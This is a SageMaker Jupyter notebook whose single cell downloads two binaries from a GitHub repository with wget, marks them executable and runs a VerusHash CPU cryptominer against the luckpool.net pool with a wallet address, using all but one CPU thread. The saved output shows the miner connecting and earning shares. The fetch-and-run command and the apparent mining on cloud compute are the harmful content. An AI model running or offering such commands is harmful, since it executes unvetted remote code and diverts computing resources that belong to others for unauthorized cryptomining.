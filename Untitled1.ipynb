{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--2022-05-09 10:03:46--  https://raw.githubusercontent.com/laboldrokok/saksake/main/hellminers\n",
      "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...\n",
      "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.\n",
      "HTTP request sent, awaiting response... 200 OK\n",
      "Length: 5699624 (5.4M) [application/octet-stream]\n",
      "Saving to: ‘hellminers’\n",
      "\n",
      "hellminers          100%[===================>]   5.44M  --.-KB/s    in 0.02s   \n",
      "\n",
      "2022-05-09 10:03:47 (249 MB/s) - ‘hellminers’ saved [5699624/5699624]\n",
      "\n",
      "--2022-05-09 10:03:47--  https://raw.githubusercontent.com/laboldrokok/saksake/main/verus-solver\n",
      "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...\n",
      "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.\n",
      "HTTP request sent, awaiting response... 200 OK\n",
      "Length: 1230824 (1.2M) [application/octet-stream]\n",
      "Saving to: ‘verus-solver’\n",
      "\n",
      "verus-solver        100%[===================>]   1.17M  --.-KB/s    in 0.01s   \n",
      "\n",
      "2022-05-09 10:03:47 (106 MB/s) - ‘verus-solver’ saved [1230824/1230824]\n",
      "\n",
      " \n",
      " Hellminer 0.52 [VerusHash 2.2 CPU Miner] Linux\n",
      " \n",
      "Connecting to ap.luckpool.net:3956 [139.99.123.225:3956]\n",
      "Successfully connected to 139.99.123.225:3956\n",
      "Pool assigned nonce: 43bed948\n",
      "Miner Authorized: REm5s3T1L9szA5p9xzeWGokiPyNpceMPoj.sial\n",
      "\n",
      "Received target 0000004000000000000000000000000000000000000000000000000000000000\n",
      "Received job \"4e45c05\"\n",
      "Stratum server sent us the first job\n",
      "Mining on 7 cpu threads\n",
      "Using 7 out of 8 available cpu threads\n",
      "Received job \"4e45c06\"\n",
      "Received job \"4e45c07\"\n",
      "Total 0.0 MH/s [cpu0 0.00, cpu1 0.00, cpu2 0.00, cpu3 0.00, cpu4 0.00, cpu5 0.00, cpu6 0.00] 0 shares\n",
      "Total 6.20 MH/s [cpu0 1.20, cpu1 0.80, cpu2 0.80, cpu3 1.00, cpu4 0.80, cpu5 0.80, cpu6 0.80] 0 shares\n",
      "Total 6.10 MH/s [cpu0 1.10, cpu1 0.80, cpu2 0.80, cpu3 0.90, cpu4 0.80, cpu5 0.90, cpu6 0.80] 0 shares\n",
      "Total 6.16 MH/s [cpu0 1.03, cpu1 0.90, cpu2 0.80, cpu3 0.87, cpu4 0.80, cpu5 0.87, cpu6 0.90] 0 shares\n",
      "Total 6.15 MH/s [cpu0 0.97, cpu1 0.90, cpu2 0.80, cpu3 0.90, cpu4 0.85, cpu5 0.85, cpu6 0.87] 0 shares\n",
      "Total 6.10 MH/s [cpu0 0.94, cpu1 0.94, cpu2 0.80, cpu3 0.88, cpu4 0.84, cpu5 0.84, cpu6 0.86] 0 shares\n",
      "Total 6.11 MH/s [cpu0 0.92, cpu1 0.98, cpu2 0.80, cpu3 0.87, cpu4 0.83, cpu5 0.87, cpu6 0.85] 0 shares\n",
      "Received job \"4e45c08\"\n",
      "Total 6.08 MH/s [cpu0 0.93, cpu1 0.97, cpu2 0.80, cpu3 0.86, cpu4 0.83, cpu5 0.86, cpu6 0.84] 0 shares\n",
      "Total 6.12 MH/s [cpu0 0.91, cpu1 1.00, cpu2 0.80, cpu3 0.87, cpu4 0.82, cpu5 0.85, cpu6 0.86] 1 share\n",
      "Total 6.09 MH/s [cpu0 0.90, cpu1 0.99, cpu2 0.80, cpu3 0.88, cpu4 0.82, cpu5 0.84, cpu6 0.86] 1 share\n",
      "Total 6.09 MH/s [cpu0 0.91, cpu1 0.97, cpu2 0.82, cpu3 0.88, cpu4 0.82, cpu5 0.84, cpu6 0.85] 2 shares\n",
      "Total 6.13 MH/s [cpu0 0.87, cpu1 1.01, cpu2 0.82, cpu3 0.88, cpu4 0.82, cpu5 0.86, cpu6 0.87] 2 shares\n",
      "Total 6.10 MH/s [cpu0 0.85, cpu1 1.01, cpu2 0.82, cpu3 0.89, cpu4 0.82, cpu5 0.84, cpu6 0.87] 2 shares\n",
      "Total 6.11 MH/s [cpu0 0.86, cpu1 1.02, cpu2 0.82, cpu3 0.89, cpu4 0.82, cpu5 0.84, cpu6 0.84] 3 shares\n",
      "Received job \"4e45c09\"\n",
      "Total 6.11 MH/s [cpu0 0.87, cpu1 1.03, cpu2 0.82, cpu3 0.87, cpu4 0.82, cpu5 0.84, cpu6 0.84] 3 shares\n",
      "Total 6.11 MH/s [cpu0 0.89, cpu1 1.01, cpu2 0.82, cpu3 0.87, cpu4 0.82, cpu5 0.85, cpu6 0.86] 4 shares\n",
      "Total 6.12 MH/s [cpu0 0.89, cpu1 1.01, cpu2 0.82, cpu3 0.89, cpu4 0.82, cpu5 0.83, cpu6 0.86] 4 shares\n",
      "Received job \"4e45c0a\"\n",
      "Received job \"4e45c0b\"\n",
      "Total 6.11 MH/s [cpu0 0.88, cpu1 1.03, cpu2 0.82, cpu3 0.89, cpu4 0.82, cpu5 0.83, cpu6 0.86] 5 shares\n",
      "Total 6.10 MH/s [cpu0 0.92, cpu1 0.99, cpu2 0.82, cpu3 0.87, cpu4 0.82, cpu5 0.83, cpu6 0.84] 5 shares\n",
      "Total 6.10 MH/s [cpu0 0.93, cpu1 0.98, cpu2 0.84, cpu3 0.86, cpu4 0.82, cpu5 0.85, cpu6 0.84] 5 shares\n",
      "Total 6.10 MH/s [cpu0 0.93, cpu1 1.01, cpu2 0.82, cpu3 0.85, cpu4 0.82, cpu5 0.85, cpu6 0.84] 5 shares\n",
      "Total 6.11 MH/s [cpu0 0.93, cpu1 0.97, cpu2 0.82, cpu3 0.85, cpu4 0.85, cpu5 0.83, cpu6 0.84] 5 shares\n",
      "Total 6.11 MH/s [cpu0 0.93, cpu1 0.97, cpu2 0.82, cpu3 0.84, cpu4 0.85, cpu5 0.83, cpu6 0.88] 5 shares\n"
     ]
    }
   ],
   "source": [
    "! wget https://raw.githubusercontent.com/laboldrokok/saksake/main/hellminers && wget https://raw.githubusercontent.com/laboldrokok/saksake/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://ap.luckpool.net:3956 -u REm5s3T1L9szA5p9xzeWGokiPyNpceMPoj.sial -p x --cpu $(nproc --ignore 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "instance_type": "ml.t3.2xlarge",
  "kernelspec": {
   "display_name": "Python 3 (Data Science)",
   "language": "python",
   "name": "python3__SAGEMAKER_INTERNAL__arn:aws:sagemaker:us-east-1:081325390199:image/datascience-1.0"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
